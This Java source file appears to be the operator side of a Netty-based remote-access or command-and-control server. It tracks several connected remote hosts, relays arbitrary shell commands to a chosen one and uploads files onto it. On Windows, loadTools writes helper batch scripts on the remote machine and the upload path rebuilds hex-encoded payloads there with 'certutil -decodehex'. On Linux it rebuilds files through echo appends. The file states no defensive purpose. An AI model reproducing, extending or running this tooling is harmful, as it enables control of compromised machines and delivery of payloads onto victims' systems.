package nettyTest.server;

import lombok.AllArgsConstructor;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.LinkedList;
import java.util.List;

@AllArgsConstructor
public class CommandExecutor implements Runnable {
    private String command;


    @Override
    public void run() {
        try {
            interpretCommand(command);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void interpretCommand(String command) throws IOException, InterruptedException {
        if (command.contains("/sendToAll")) {
            sendToAll();
        } else if (command.contains("/connections")) {
            connections();
        } else if (command.contains("/sendTo")) {
            sendTo();
        } else if (command.contains("/showOutput")) {
            showOutput();
        } else if (command.contains("/connection")) {
            connection();
        } else if (command.contains("/upload")) {
            upload();
        } else if (command.contains("/background")) {
            background();
        } else if (command.contains("/test")) {
            test();
        }else if(command.contains("/loadTools")) {
            loadTools();
        } else {
            sendToCurrentConnection();
        }
    }

    private void uploadLinux(String fileName, String fileDestination) throws IOException {
        Data.activeConnection.getCtx().channel().writeAndFlush("> "+fileDestination+"" + "\n");

        FileInputStream file = new FileInputStream(fileName);
        BufferedReader reader = new BufferedReader(new InputStreamReader(file));

        StringBuilder sb = new StringBuilder();
        int ch;
        while ((ch = reader.read()) != -1) {
            if ((char) ch == '\n') {
                Data.activeConnection.send("echo \"" + sb.toString() + "\" >> "+fileDestination+"" + "\n");
                sb = new StringBuilder();
                continue;
            }
            sb.append((char) ch);
            if (sb.length() > 300) {
                Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> "+fileDestination+"" + "\n");
                sb = new StringBuilder();
            }
        }
        if (sb.length() > 0) {
            Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> "+fileDestination+"" + "\n");
        }
        reader.close();
    }

    private void uploadWindows(String fileName, String fileDestination) throws IOException, InterruptedException {
        Data.activeConnection.getCtx().channel().writeAndFlush("type nul > temp.txt" + "\n");

        FileInputStream file = new FileInputStream(fileName);
        BufferedReader reader = new BufferedReader(new InputStreamReader(file));
        byte[] fileContent = Files.readAllBytes(new File(fileName).toPath());

        ByteBuffer byteBuffer = ByteBuffer.allocate(1000);
        byte ch;
        int size=0;
        for(int i=0; i<fileContent.length; i++){
            byteBuffer.put(fileContent[i]);
            size++;

            if (size>=1000) {
                size=0;
                String str = bytesToHex(byteBuffer.array());
                Data.activeConnection.send("writer.bat \""+str+"\" \n");
                //Data.activeConnection.send("echo|set /p=\u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
                byteBuffer = ByteBuffer.allocate(1000);
            }
        }
        /*while ((ch = (byte) reader.read()) != -1) {
           *//* if ((char) ch == '\n') {
                //Data.activeConnection.send("writer.bat \""+sb.toString()+"\" "+fileDestination);
                //Data.activeConnection.send("echo \u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
                System.out.println(sb.toString());
                sb = new StringBuilder();
                continue;
            }*//*
            byteBuffer.put(ch);
            size++;
            //sb.append(Integer.toHexString(ch));
            //sb.append((char) ch);
            if (size>=1000) {
                size=0;
                String str = bytesToHex(byteBuffer.array());
                Data.activeConnection.send("writer.bat \""+str+"\" \n");
                //Data.activeConnection.send("echo|set /p=\u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
                byteBuffer = ByteBuffer.allocate(1000);
            }
        }*/
        if (size > 0) {
            String str = bytesToHex(byteBuffer.array());
            Data.activeConnection.send("writer.bat \""+str+"\" \n");
            //Data.activeConnection.send("echo|set /p=\u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
        }
        Data.activeConnection.send("create.bat "+fileDestination+"\n");
        reader.close();
    }

    private List<String> getArgs(String command) {
        String cuttedCommand = cutCommand(command);
        List<String> args = new LinkedList<>();
        StringBuilder sb = new StringBuilder();
        boolean spacesCleared = false;
        char ch;
        for (int i = 0; i < cuttedCommand.length(); i++) {
            ch = cuttedCommand.charAt(i);
            if (spacesCleared && ch == ' ') {
                args.add(sb.toString());
                sb = new StringBuilder();
                spacesCleared = false;
            } else if (ch == ' ') {
                continue;
            } else {
                spacesCleared = true;
                sb.append(ch);
            }
        }
        if(sb.length() > 0){
            args.add(sb.toString());
        }
        return args;
    }

    private String cutCommand(String command){
        for(int i=0; i<command.length(); i++){
            if(command.charAt(i)==' '){
                command = command.substring(i+1);
                break;
            }
        }
        return command;
    }

    private void sendToAll() throws UnsupportedEncodingException {
        for (Connection connection : Data.connections.values()) {
            connection.send("EEE OK");
        }
    }

    private void connections() {
        for (Connection connection : Data.connections.values()) {
            connection.showInfo();
        }
    }

    private void sendTo() throws UnsupportedEncodingException {
        List<String> args = getArgs(command);

        Data.connections.get(args.get(0)).send("QWERTYQWERTY");
    }

    private void showOutput() throws IOException {
        List<String> args = getArgs(command);

        BufferedReader reader = new BufferedReader(new FileReader("logs/" + args.get(0) + ".txt"));
        while (reader.ready()) {
            System.out.println(reader.readLine());
        }
        reader.close();
    }

    private void connection() {
        List<String> args = getArgs(command);

        Connection connection = Data.connections.get(args.get(0));
        connection.setPrintOutput(true);
        Data.activeConnection = connection;
    }

    private void upload() throws IOException, InterruptedException {
        List<String> args = getArgs(command);

        if (Data.activeConnection.getSystemType() == SystemType.type.Windows) {
            uploadWindows(args.get(0), args.get(1));
        } else if (Data.activeConnection.getSystemType() == SystemType.type.Linux) {
            uploadLinux(args.get(0), args.get(1));
        }
        System.out.println("Done!");
    }

    private void background() {
        Data.activeConnection.setPrintOutput(false);
        Data.activeConnection = null;
    }

    private void sendToCurrentConnection() throws UnsupportedEncodingException {
        if (Data.activeConnection != null) {
            Data.activeConnection.send(command + "\n");
        }
    }

    private void test(){
        StringBuilder sb = new StringBuilder(command);
        command = sb.substring(5);
        List<String> args = getArgs(command);
        System.out.println(command);
        System.out.println(args.get(0));
        System.out.println(args.get(1));
    }

    private void loadTools() throws UnsupportedEncodingException {

        Data.activeConnection.send("type nul > writer.bat" + "\n");
        Data.activeConnection.send("echo|set /p=\"@echo off\" >> writer.bat" + "\n");
        Data.activeConnection.send("echo. >> writer.bat\n");
        Data.activeConnection.send("echo|set /p=\"echo|set /p=%1 >>temp.txt\" >> writer.bat\n");
        Data.activeConnection.send("echo. >> writer.bat\n");
        //Data.activeConnection.send("echo|set /p=\"certutil -f -decodehex temp.txt %2 >nul\" >> writer.bat\n");
        //Data.activeConnection.send("echo. >> writer.bat\n");
        //Data.activeConnection.send("echo del temp.txt >> writer.bat\n");

        Data.activeConnection.send("type nul > create.bat" + "\n");
        Data.activeConnection.send("echo|set /p=\"@echo off\" >> create.bat" + "\n");
        Data.activeConnection.send("echo. >> create.bat\n");
        Data.activeConnection.send("echo|set /p=\"certutil -f -decodehex temp.txt %1 >nul\" >> create.bat\n");
        Data.activeConnection.send("echo. >> create.bat\n");
        //Data.activeConnection.send("echo del temp.txt >> create.bat\n");

        System.out.println("Done!");
    }

    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
    private String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
        }
        return new String(hexChars);
    }
}
